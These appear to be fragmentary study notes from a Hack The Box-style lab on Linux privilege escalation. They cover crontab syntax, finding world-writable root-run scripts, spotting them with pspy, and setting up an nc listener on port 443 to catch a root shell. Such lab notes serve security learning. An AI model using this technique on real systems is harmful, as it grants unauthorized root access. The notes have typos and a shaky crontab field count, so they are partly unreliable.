...
cron jobs, can be run once on boot or multiple times on a machine. it is usually used for administrative tasks like running backups or cleaning up directories.

The `contrab` command is used to create a cron file. While is run by the cron daemon on the schedule that's specified. The cron file then gets created under `/var/spool/cron`.  Each entry requires 6 items in the following order;
- minutes
- hours
- days
- months
...
for example here; `0 */12 * * * /home/admin/backup.sh`, this command runs at 0 minutes, every 12 hours, everyday, every month, every week

easier breakdown to understand
...
the root crontab is almost ways only editable by the root user with full sudo privileges, it can still be abused though. We may find a world writeable script that runs as root and even if we cannot read the crontab to know when it executes what matters is that it still executes
...
First lets look around the system for any writeable files or directories. the file `backup.sh`, in the `/dms-backups` is a interesting directory for example 
...
we can confirm its a cronjob using a tool like pspy, its a CLI tool that we can use to view running processes without needing rootp rivs. we can use it to see the commabds being run by other users and it works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).
...
```shell-session
Hillside_1@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
...
```shell-session
Hillside_1@htb[/htb]$ ls -la /dmz-backups/
...
```shell-session
Hillside_1@htb[/htb]$ ./pspy64 -pf -i 1000
...
```shell-session
Hillside_1@htb[/htb]$ cat /dmz-backups/backup.sh 
...
```shell-session
Hillside_1@htb[/htb]$ nc -lnvp 443
